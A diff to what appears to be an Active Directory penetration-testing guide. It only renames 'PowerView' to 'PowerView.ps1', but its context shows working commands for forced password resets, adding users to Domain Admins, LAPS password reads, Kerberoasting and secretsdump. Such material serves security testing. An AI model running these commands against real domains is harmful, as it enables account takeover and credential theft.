@@ -403,7 +403,7 @@ flowchart LR
 **Option A: Force Password Reset**
 
 ```powershell
-# PowerView
+# PowerView.ps1
 Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force) -Verbose
 
 # net command
@@ -453,7 +453,7 @@ flowchart LR
 ```
 
 ```powershell
-# PowerView
+# PowerView.ps1
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'owneduser' -Verbose
 
 # net command
@@ -520,7 +520,7 @@ impacket-psexec domain.local/administrator@target-pc.domain.local -k -no-pass
 **Option B: Read LAPS Password**
 
 ```powershell
-# PowerView
+# PowerView.ps1
 Get-DomainComputer target-pc -Properties ms-mcs-AdmPwd
 
 # AD Module
@@ -587,7 +587,7 @@ Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity owneduser -R
 ### 4.8 ForceChangePassword
 
 ```powershell
-# PowerView
+# PowerView.ps1
 Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
 ```
 
@@ -637,7 +637,7 @@ impacket-secretsdump domain.local/owneduser:Password123@<DC_IP> -just-dc-user Ad
 Rubeus.exe kerberoast /outfile:hashes.txt
 Rubeus.exe kerberoast /user:svc_mssql /nowrap
 
-# PowerView
+# PowerView.ps1
 Invoke-Kerberoast -OutputFormat Hashcat | Select Hash | Out-File hashes.txt
 ```
 
@@ -899,7 +899,7 @@ SET u.highvalue = true
 | **BloodHound CE** | Community Edition (latest) | [https://github.com/SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound) |
 | **Rubeus** | Kerberos abuse | [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
 | **Impacket** | AD/SMB tools suite | [https://github.com/fortra/impacket](https://github.com/fortra/impacket) |
-| **PowerView** | AD enumeration | [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
+| **PowerView.ps1** | AD enumeration | [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
 | **Certipy** | AD CS attacks | [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy) |
 | **SharpGPOAbuse** | GPO exploitation | [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) |
 | **pywhisker** | Shadow Credentials | [https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker) |
